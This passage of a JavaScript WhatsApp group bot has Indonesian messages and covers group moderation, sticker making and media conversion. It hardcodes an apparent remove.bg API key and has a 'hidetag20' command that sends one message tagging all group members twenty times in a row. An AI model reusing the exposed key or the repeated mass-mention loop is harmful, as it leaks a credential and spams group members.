if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
 case 'revoke': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
 if (!isGroup) return reply(mess.only.group)
 if (!isGroupAdmins) return(mess.only.admin)
 if (!isBotGroupAdmins) return(mess.only.Badmin)
  json = ['action', 'inviteReset', from]
 zeroyt7.query({json, expect200: true})
  reply('Sukses Mereset Link Group')
 break
case 'kontag': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return(mess.only.admin)
argzi = arg.split('|')
if (!argzi) return reply(`Penggunaan ${prefix}kontak @tag|nama`)
if (mek.message.extendedTextMessage != undefined){
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
hideTagKontak(from, mentioned[0].split('@')[0], argzi[1])
} else {
hideTagKontak(from, argzi[0], argzi[1])
}
break
case 'totag': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isGroup) return reply(mess.only.group)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
encmediau = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
file = await zeroyt7.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
value = args.join(" ")
var group = await zeroyt7.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
contextInfo: { mentionedJid: mem },
quoted: fstatus
}
ini_buffer = fs.readFileSync(file)
zeroyt7.sendMessage(from, ini_buffer, sticker, options)
fs.unlinkSync(file)
} else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
encmediau = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
file = await zeroyt7.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
value = args.join(" ")
var group = await zeroyt7.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
contextInfo: { mentionedJid: mem },
quoted: fstatus
}
ini_buffer = fs.readFileSync(file)
zeroyt7.sendMessage(from, ini_buffer, image, options)
fs.unlinkSync(file)
} else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
encmediau = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
file = await zeroyt7.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
value = args.join(" ")
var group = await zeroyt7.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
mimetype : 'audio/mp4', duration: 359996400,
ptt : true,
contextInfo: { mentionedJid: mem },
quoted: mek
}
ini_buffer = fs.readFileSync(file)
zeroyt7.sendMessage(from, ini_buffer, audio, options)
fs.unlinkSync(file)
 } else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
file = await zeroyt7.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
value = args.join(" ")
var group = await zeroyt7.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
mimetype : 'video/gif',
contextInfo: { mentionedJid: mem },
quoted: fstatus
}
ini_buffer = fs.readFileSync(file)
zeroyt7.sendMessage(from, ini_buffer, video, options)
fs.unlinkSync(file)
} else if ((isMedia && !mek.message.videoMessage || isQuotedDocument) && args.length == 0) {
encmediau = isQuotedDocument ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
file = await zeroyt7.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
value = args.join(" ")
var group = await zeroyt7.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
mimetype : 'text/plain',
contextInfo: { mentionedJid: mem },
quoted: fstatus
}
ini_buffer = fs.readFileSync(file)
zeroyt7.sendMessage(from, ini_buffer, document, options)
fs.unlinkSync(file)
}  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
file = await zeroyt7.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
value = args.join(" ")
var group = await zeroyt7.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
mimetype : 'video/mp4', duration: 359996400,
contextInfo: { mentionedJid: mem },
quoted: fstatus
}
ini_buffer = fs.readFileSync(file)
zeroyt7.sendMessage(from, ini_buffer, video, options)
fs.unlinkSync(file)
} else{
  reply(`reply gambar/dokumen/gif/sticker/audio/video dengan caption ${prefix}totag`)
}
break
case 'link': 
case 'linkgc': 
case 'linkgrup' :
case 'linkgroup': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isGroup) return reply(mess.only.group)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
linkgc = await zeroyt7.groupInviteCode(from)
yeh = `https://chat.whatsapp.com/${linkgc}\n\nlink Group *${groupName}*`
zeroyt7.sendMessage(from, yeh, text, { quoted: fstatus })
break
case 'online': 
case 'listonline': 
case 'here':                
case 'nyimak': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isGroup) return reply(mess.only.group)
 try {
 let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
 let online = [...Object.keys(zeroyt7.chats.get(ido).presences), zeroyt7.user.jid]
 zeroyt7.sendMessage(from, 'List Online:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, { quoted: fstatus, contextInfo: { mentionedJid: online }})
 } catch (e) {
 reply(`${e}`)
}
 break
case 'leave': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isGroupAdmins) return reply(mess.only.admin)
  setTimeout( () => {
  zeroyt7.groupLeave(from) 
  }, 2000)
  setTimeout( () => {
  reply('Byee...')
  }, 0)
  break
case 'welcome': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (args.length < 1) return reply(`Ketik :\n${prefix}welcome 1 untuk mengaktifkan\n${prefix}welcome 0 untuk menonaktifkan`)
if ((args[0]) === '1') {
if (isWelkom) return reply('welcome sudah aktif')
_welkom.push(from)
fs.writeFileSync('./F2/welcome.json', JSON.stringify(_welkom))
reply(`\`\`\`✓Sukses mengaktifkan fitur welcome di group\`\`\` *${groupMetadata.subject}*`)
} else if ((args[0]) === '0') {
if (!isWelkom) return reply('welcome sudah off sebelumnya')
_welkom.splice(from, 1)
fs.writeFileSync('./F2/welcome.json', JSON.stringify(_welkom))
reply(`\`\`\`✓Sukses menonaktifkan fitur welcome di group\`\`\` *${groupMetadata.subject}*`)
} else {
reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
}
break
case 'antilink': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
  if (!isGroup) return reply(mess.only.group)
  if (!isGroupAdmins) return reply(mess.only.admin)
  if (!isBotGroupAdmins) return reply(`Bot Harus jadi Admin`)
  if (!q) return reply(`1 untuk mengaktifkan, 0 untuk mematikan`)
  if (args[0].toLowerCase() === '1'){
  if (isAntiLink) return reply(`Udah aktif`)
  antilink.push(from)
  fs.writeFileSync('./F2/antilink.json', JSON.stringify(antilink))
  reply('*「 ANTILINK DI AKTIFKAN 」*\n\nYang Ngirim Link Group Bakal Ke Kick!')
  } else if (args[0].toLowerCase() === '0'){
  let anu = antilink.indexOf(from)
  antilink.splice(anu, 1)
  fs.writeFileSync('./F2/antilink.json', JSON.stringify(antilink))
  reply('*「 ANTILINK DI NONAKTIFKAN 」*')
  } else {
  reply(`1 untuk mengaktifkan, 0 untuk mematikan`)
}
  break
case 'antivirtex': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
  if (!isGroup) return reply(mess.only.group)
  if (!isGroupAdmins) return reply(mess.only.admin)
  if (!isBotGroupAdmins) return reply(`Bot Harus jadi Admin`)
  if (!q) return reply(`1 untuk mengaktifkan, 0 untuk mematikan`)
  if (args[0].toLowerCase() === '1'){
  if (isAntiVirtex) return reply(`Udah aktif`)
  antivirtex.push(from)
  fs.writeFileSync('./F2/antivirtex.json', JSON.stringify(antivirtex))
  reply('*「 ANTI VIRTEX DI AKTIFKAN 」*\n\nYang Ngirim Link Youtube Bakal Ke Kick!')
  } else if (args[0].toLowerCase() === '0'){
  let anu = antivirtex.indexOf(from)
  antivirtex.splice(anu, 1)
  fs.writeFileSync('./F2/antivirtex.json', JSON.stringify(antivirtex))
  reply('*「 ANTI VIRTEX DI NONAKTIFKAN 」*')
  } else {
  reply(`1 untuk mengaktifkan, 0 untuk mematikan`)
}
  break
case 'opengc' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
reply(`\`\`\`✓Sukses Membuka Group\`\`\` *${groupMetadata.subject}*`)
zeroyt7.groupSettingChange(from, GroupSettingChange.messageSend, false)
break
case 'closegc' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
reply(`\`\`\`✓Sukses Menutup Group\`\`\` *${groupMetadata.subject}*`)
zeroyt7.groupSettingChange(from, GroupSettingChange.messageSend, true)
break
case 'linkgrup' :
if (!isGroup) return reply(mess.only.group)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
linkgc = await zeroyt7.groupInviteCode(from)
yeh = `https://chat.whatsapp.com/${linkgc}\n\nlink Group *${groupName}*`
zeroyt7.sendMessage(from, yeh, text, { quoted: fstatus })
break
case 'promote' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di jadi admin!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Perintah di terima, anda menjdi admin :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
zeroyt7.groupMakeAdmin(from, mentioned)
} else {
mentions(`Perintah di terima, @${mentioned[0].split('@')[0]} Kamu Menjadi Admin Di Group *${groupMetadata.subject}*`, mentioned, true)
zeroyt7.groupMakeAdmin(from, mentioned)
}
break
case 'demote' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di tidak jadi admin!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Perintah di terima, anda tidak menjadi admin :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
zeroyt7.groupDemoteAdmin(from, mentioned)
} else {
mentions(`Perintah di terima, Menurunkan : @${mentioned[0].split('@')[0]} Menjadi Member`, mentioned, true)
zeroyt7.groupDemoteAdmin(from, mentioned)
}
break
case 'add': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
try {
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) {
entah = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
response = await zeroyt7.groupAdd(from, [entah])
o = response.participants[0]
let inv = (Object.values(o))
if(inv[0].code == 409) return reply('Target Sudah Di Didalam Group!')
if(inv[0].code == 403) return reply('Eror, user private acc')
if(inv[0].code == 408) return reply('Eror, user baru saja keluar')
if(inv[0].code == 401) return reply('Eror, Karena Bot Di Block Oleh Target')
} else {
entah = mek.message.extendedTextMessage.contextInfo.participant
response = await zeroyt7.groupAdd(from, [entah])
o = response.participants[0]
let inv = (Object.values(o))
if(inv[0].code == 409) return reply('Target Sudah Di Didalam Group!')
if(inv[0].code == 403) return reply('Gagal, Karena Di Private')
if(inv[0].code == 408) return reply('Gagal, Karena Target Baru² Saja Keluar')
if(inv[0].code == 401) return reply('Gagal, Karena Bot Di Block Oleh Target')
}
} catch {
return 
}
break
case 'kick' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di tendang!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Perintah di terima, mengeluarkan :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
zeroyt7.groupRemove(from, mentioned)
} else {
mentions(`Perintah di terima, mengeluarkan : @${mentioned[0].split('@')[0]}`, mentioned, true)
zeroyt7.groupRemove(from, mentioned)
}
break
case 'hedsot': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag Orang Nya Kak')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
heds = 'Bismillah Hedsot >_< :\n'
for (let _ of mentioned) {
heds += `@${_.split('@')[0]}\n`
}
mentions(heds, mentioned, true)
zeroyt7.groupRemove(from, mentioned)
mentions(heds, mentioned, true)
zeroyt7.groupAdd(from, [num])
} else {
mentions(`Berhasil Meng hedsot kepalanya  : @${mentioned[0].split('@')[0]}`, mentioned, true)
zeroyt7.groupRemove(from, mentioned)
}
break
case 'tagall': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
members_id = []
teks = (args.length > 1) ? args.join(' ').trim() : ''
teks += '\n\n'
for (let mem of groupMembers) {
teks += `• @${mem.jid.split('@')[0]}\n`
members_id.push(mem.jid)
}
mentions(teks, members_id, true)
break
case 'setname': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
zeroyt7.groupUpdateSubject(from, `${body.slice(9)}`)
zeroyt7.sendMessage(from, `\`\`\`✓Sukses Mengganti Nama Group Menjadi\`\`\` *${body.slice(9)}*`, text, { quoted: fstatus })
break
case 'setdesc': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
zeroyt7.groupUpdateDescription(from, `${body.slice(9)}`)
zeroyt7.sendMessage(from, `\`\`\`✓Sukses Mengganti Deskripsi Group\`\`\` *${groupMetadata.subject}* Menjadi: *${body.slice(9)}*`, text, { quoted: fstatus })
break
case 'setpp': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
media = await zeroyt7.downloadAndSaveMediaMessage(mek, './F2/media_user')
await zeroyt7.updateProfilePicture(from, media)
reply(mess.wait)
reply(`\`\`\`✓Sukses Mengganti Profil Group\`\`\` *${groupMetadata.subject}*`)
break
case 'hidetag': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
var value = body.slice(9)
var group = await zeroyt7.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
text: value,
contextInfo: { mentionedJid: mem },
quoted: fstatus
}
zeroyt7.sendMessage(from, options, text)
break
case 'getpp': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
   if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) {
   linkpp = await zeroyt7.getProfilePicture(from) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
   buffer = await getBuffer(linkpp)
   zeroyt7.sendMessage(from, buffer, image, {caption: "Nih", quoted: fstatus })
   } else if (mek.message.extendedTextMessage.contextInfo.mentionedJid === null || mek.message.extendedTextMessage.contextInfo.mentionedJid === undefined) {
   mberr = mek.message.extendedTextMessage.contextInfo.participant
   linkpp = await zeroyt7.getProfilePicture(mberr) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
   buffer = await getBuffer(linkpp)
   zeroyt7.sendMessage(from, buffer, image, { quoted: fstatus, caption: `Profile Picture of @${mberr.split("@")[0]}`, contextInfo: { "mentionedJid": [mberr] }})
   } else if (mek.message.extendedTextMessage.contextInfo.mentionedJid.length > 0) {
   mberr = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
   linkpp = await zeroyt7.getProfilePicture(mberr) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
   buffer = await getBuffer(linkpp)
   zeroyt7.sendMessage(from, buffer, image, { quoted: fstatusi, caption: `Profile Picture of @${mberr.split("@")[0]}`, contextInfo: { "mentionedJid": [mberr] }})
}
   break
case 'hidetag20': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if(!isGroup) return reply(mess.only.group)
if (!isPremium && !isOwner ) return sendButMessage (mess.only.prem) 
var value = body.slice(11)
var group = await zeroyt7.groupMetadata(from)
var member = group['participants']
var mem = []
member.map( async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
text: value,
contextInfo: { mentionedJid: mem },
quoted: mek
}
zeroyt7.sendMessage(from, options, text)
.then(() => {zeroyt7.sendMessage(from, options, text)})
.then(() => {zeroyt7.sendMessage(from, options, text)})
.then(() => {zeroyt7.sendMessage(from, options, text)})
.then(() => {zeroyt7.sendMessage(from, options, text)})
.then(() => {zeroyt7.sendMessage(from, options, text)})
.then(() => {zeroyt7.sendMessage(from, options, text)})
.then(() => {zeroyt7.sendMessage(from, options, text)})
.then(() => {zeroyt7.sendMessage(from, options, text)})
.then(() => {zeroyt7.sendMessage(from, options, text)})
.then(() => {zeroyt7.sendMessage(from, options, text)})
.then(() => {zeroyt7.sendMessage(from, options, text)})
.then(() => {zeroyt7.sendMessage(from, options, text)})
.then(() => {zeroyt7.sendMessage(from, options, text)})
.then(() => {zeroyt7.sendMessage(from, options, text)})
.then(() => {zeroyt7.sendMessage(from, options, text)})
.then(() => {zeroyt7.sendMessage(from, options, text)})
.then(() => {zeroyt7.sendMessage(from, options, text)})
.then(() => {zeroyt7.sendMessage(from, options, text)})
.then(() => {zeroyt7.sendMessage(from, options, text)})
break
 
   
//━━━━━━━━━━━━━━━[ FITUR STICKER ]━━━━━━━━━━━━━━━━━//

case 'attp': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length == 0) return reply(`Example: ${prefix + command} Hai`)
buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
zeroyt7.sendMessage(from, buffer, sticker, { quoted: fstatus })
break
case 'ttp': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
woy = args.join(" ")
reply('wait....')
anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=white`
sendStickerFromUrl(from, anjay) 
break
case 'sticker': 
case 'stiker': 
case 's': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
const media = await zeroyt7.downloadAndSaveMediaMessage(encmedia, './F2/media_user')
ran = getRandom('.webp')
await ffmpeg(`./${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
reply(mess.error.stick)
})
.on('end', function () {
console.log('Finish')
buffer = fs.readFileSync(ran)
costum(buffer, sticker, Verived, `Jangan Lupa SUBSCRIBE YT : rimu`)
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
const media = await zeroyt7.downloadAndSaveMediaMessage(encmedia, './F2/media_user')
ran = getRandom('.webp')
reply(mess.wait)
await ffmpeg(`./${media}`)
.inputFormat(media.split('.')[1])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply(`❌ Gagal, pada saat mengkonversi ${tipe} ke stiker. pastikan untuk video yang dikirim tidak lebih dari 9 detik`)
})
.on('end', function () {
console.log('Finish')
costum(fs.readFileSync(ran), sticker, Verived, `~ Nih Dah Jadi Gif Stikernya`)
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else if ((isMedia || isQuotedImage) && args[0] == 'nobg') {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
const media = await zeroyt7.downloadAndSaveMediaMessage(encmedia, './F2/media_user')
ranw = getRandom('.webp')
ranp = getRandom('.png')
reply(mess.wait)
keyrmbg = 'bcAvZyjYAjKkp1cmK8ZgQvWH'
await removeBackgroundFromImageFile({ path: media, apiKey: keyrmbg, size: 'auto', type: 'auto', ranp }).then(res => {
fs.unlinkSync(media)
let buffer = Buffer.from(res.base64img, 'base64')
fs.writeFileSync(ranp, buffer, (err) => {
if (err) return reply('Gagal, Terjadi kesalahan, silahkan coba beberapa saat lagi.')
})
exec(`ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${ranw}`, (err) => {
fs.unlinkSync(ranp)
if (err) return reply(mess.error.stick)
zeroyt7.sendMessage(from, fs.readFileSync(ranw), sticker, { quoted: fstatus })
fs.unlinkSync(ranw)
})
})
} else {
reply(`Kirim gambar dengan caption ${prefix}sticker atau tag gambar yang sudah dikirim`)
}
break
case 'doge': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
reply(mess.wait)
fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
sendStickerFromUrl(from, pjr)
}
)
break
case 'patrick': 
case 'pat': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
reply(mess.wait)
fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
  sendStickerFromUrl(from, pjr)
}
)
break
case 'gura': 
case 'gawgura': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
reply(mess.wait)
fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
sendStickerFromUrl(from, pjr)
}
)
break
case 'anime': 
case 'stickeranime': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
reply(mess.wait)
fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/animestick')
.then(res => res.text())
.then(body => {
let todd = body.split("\n");
let pjrr = todd[Math.floor(Math.random() * todd.length)];
sendStickerFromUrl(from, pjrr)
}
)
break
 
//━━━━━━━━━━━━━━━[ FITUR CONVERT ]━━━━━━━━━━━━━━━━━//

case 'toimg': 
case 'toimage': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isQuotedSticker) return reply(' reply stickernya gan')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
media = await zeroyt7.downloadAndSaveMediaMessage(encmedia, './F2/media_user')
ran = getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply(' Gagal, pada saat mengkonversi sticker ke gambar ')
buffer = fs.readFileSync(ran)
costum(buffer, image, Verived, `Jangan Lupa SUBSCRIBE YT : rimu`)
fs.unlinkSync(ran)
})
break
case 'tomp3': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
zeroyt7.updatePresence(from, Presence.recording)
if (!isQuotedVideo) return reply('Reply Video nya Tod')
reply(mess.wait)
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
media = await zeroyt7.downloadAndSaveMediaMessage(encmedia, './F2/media_user')
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply('Gagal, pada saat mengkonversi video ke mp3')
bufferlkj = fs.readFileSync(ran)
zeroyt7.sendMessage(from, bufferlkj, audio, { mimetype: 'audio/mp4', quoted: fstatus })
fs.unlinkSync(ran)
})
break
case 'tovideo': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isQuotedSticker) return reply('Reply stikernya')
reply(mess.wait)
anumedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
anum = await zeroyt7.downloadAndSaveMediaMessage(anumedia, './F2/media_user')
ran = getRandom('.webp')
exec(`ffmpeg -i ${anum} ${ran}`, (err) => {
fs.unlinkSync(anum)
buffer = fs.readFileSync(ran)
zeroyt7.sendMessage(from, buffer, video, { quoted: fstatus, caption: 'Success' })
fs.unlinkSync(ran)
})
break
case 'tinyurl': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
reply(mess.wait)
